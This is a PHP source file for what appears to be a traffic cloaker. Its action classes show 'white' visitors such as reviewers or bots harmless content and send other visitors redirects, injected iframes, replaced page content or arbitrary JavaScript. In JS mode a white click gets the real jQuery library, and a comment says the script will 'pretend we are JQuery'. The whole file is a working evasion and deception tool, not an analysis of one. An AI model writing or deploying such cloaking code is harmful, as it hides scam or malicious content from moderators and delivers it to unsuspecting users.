<?php
require_once __DIR__ . '/redirect.php';
class CloakerAction
{
    public string $click_type;
    public string $action;
    public string $value;
    public int|string $redirect_type;
    
    public function __construct(string $click_type, string $action, string $value, int|string $redirect_type=0)
    {
        $this->click_type = $click_type;
        $this->action = $action;
        $this->value = $value;
        $this->redirect_type = $redirect_type;
    }

    public function perform(){
        switch ($this->action){
            case 'html':
                echo $this->value;
                break;
            case 'redirect':
                if ($this->redirect_type === 'meta') {
                    $url = htmlspecialchars($this->value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
                    echo '<!doctype html><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=' . $url . '">';
                } elseif ($this->redirect_type === 'js') {
                    $url = json_encode($this->value, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
                    echo '<!doctype html><meta charset="utf-8"><script>location.replace(' . $url . ');</script>';
                } else {
                    redirect($this->value, (int)$this->redirect_type, true);
                }
                break;
            case 'error':
                http_response_code($this->value);
                break;
            default:
                die($this->value);
        }
    }
}

class JsAction extends CloakerAction
{
    public static function FromCloakerAction(CloakerAction $action):JsAction
    {
        return new JsAction($action->click_type, $action->action, $action->value, $action->redirect_type);
    }

    private function content_replace():string
    {
        $js_code = file_get_contents(__DIR__.'/js/replace.js');
        $b64 = base64_encode($this->value);
        $js_code .= "\nreplaceContent('$b64');";
        return $js_code;
    }
    
    private function show_iframe():string
    {
        $js_code = file_get_contents(__DIR__.'/js/iframe.js');
        $b64 = base64_encode($this->value);
        $js_code .= "\nshowIframe('$b64');";
        return $js_code;
    }

    private function meta_redirect(): string
    {
        $js_code = file_get_contents(__DIR__.'/js/metaredirect.js');
        $js_code .= "\nmetaRedirect('$this->value');";
        return $js_code;
    }

    public function perform(){
        header('Content-Type: text/javascript');

        //for white clicks and js connect we don't need 
        //to change the existing white or to redirect
        //just stay where we are and pretend we are JQuery, haha
        if ($this->click_type === 'white') {
            $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
            echo $jq['content'];
            return;
        }
        
        switch ($this->action){
            case 'html_content':
                $js_code = $this->content_replace();
                break;
            case 'html_iframe':
                $js_code = $this->show_iframe();
                break;
            case 'redirect':
                $url = urldecode($this->value);
                $js_code = $this->meta_redirect();
                break;
            case 'js':
                $js_code = $this->value;
                break;
            default:
                http_response_code(404); 
                return;
        }

        echo $js_code;
    }
}


class PhpAction extends CloakerAction
{
    public static function FromCloakerAction(CloakerAction $action):PhpAction
    {
        return new PhpAction($action->click_type, $action->action, $action->value, $action->redirect_type);
    }
    
    public function perform(){
        header('Content-Type: application/json');

        //for white clicks we just send action='none'
        if ($this->click_type === 'white') {
            echo json_encode(['action' => 'none']);
            return;
        }
        
        if ($this->action === 'html')
            $this->value = base64_encode($this->value);

        echo json_encode($this);
    }
}
